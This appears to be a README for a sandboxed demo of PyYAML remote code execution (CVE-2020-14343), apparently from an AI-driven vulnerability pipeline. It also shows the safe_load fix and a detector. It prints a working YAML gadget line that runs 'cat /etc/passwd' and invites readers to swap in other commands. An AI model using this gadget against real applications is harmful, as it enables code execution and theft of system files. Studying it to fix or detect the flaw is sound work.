# Manual RCE demo — see the exploit run with your own eyes

This demo makes a malicious YAML file **actually execute** `id`, `whoami`, and
`uname` inside the target, so you can see real command output — undeniable proof
of remote code execution. Everything runs inside the gVisor-sandboxed container
and is thrown away afterward (`--rm`), so it is safe.

> Run everything from a **PowerShell** window.

## The one command

```
wsl -d Ubuntu -- bash /root/pyyaml_demo/pyyaml_demo.sh
```

That runs four labelled sections. Here is what each means and what you should see.

---

### Section 1 — the VULNERABLE app actually runs the attacker's command
The app does `yaml.load(data, Loader=yaml.FullLoader)` on the malicious file.
**You will see real output**, for example:
```
=== ATTACKER CODE IS NOW RUNNING INSIDE THE TARGET ===
uid=0(root) gid=0(root) groups=0(root)      <- output of the `id` command
root                                         <- output of `whoami`
Linux ... x86_64 GNU/Linux                   <- output of `uname -a`
=== attacker wrote /tmp/pwned_by_yaml.txt ===
```
Those three lines are produced by shell commands the attacker smuggled inside a
YAML file. That is the whole point: **plain data turned into running code.**

### Section 2 — proof the attacker changed the target's disk
It reads back a file the attacker's code created:
```
--- cat /tmp/pwned_by_yaml.txt ---
RCE via CVE-2020-14343
```

### Section 3 — the FIX: `yaml.safe_load()` refuses the attack
The same file, loaded the safe way, runs nothing:
```
>>> SAFE: yaml.safe_load REFUSED the malicious gadget. No code ran.
```

### Section 4 — how the pipeline DETECTS it
This runs the pipeline's oracle wrapper (`/work/entry`). Instead of letting the
command finish, it **catches the attack the instant it is proven and aborts**:
```
exit=134
```
Exit 134 is the "alarm" the harness reads as a crash. (Section 1 lets the command
finish so you can see output; Section 4 shows how the automated pipeline stops it
early. Same bug, two ways of handling it.)

---

## Change what the attacker runs (optional)

Open `poc_id.yaml`. The commands live in the last line, inside `listitems:`.
Swap `id` / `whoami` for anything, e.g. `cat /etc/passwd` or `ls -la /`:
```yaml
listitems: 'import os; os.system("cat /etc/passwd")'
```
Save, then re-run the one command above. No rebuild needed (the file is mounted in).

## Files in this folder
- `poc_id.yaml` — the malicious YAML (the exploit).
- `demo_load.py` — a tiny stand-in for a real app that loads YAML two ways (vulnerable / safe).
- `pyyaml_demo.sh` — runs all four sections.

## Why this is the same bug the AI agent found
The agent's automated PoC used `listitems: "0"` — it only needed to *prove* the
gadget reaches Python's `exec`. This demo uses the identical gadget but points
`exec` at real shell commands so the execution is visible. Same vulnerability
(CVE-2020-14343), just made human-obvious.
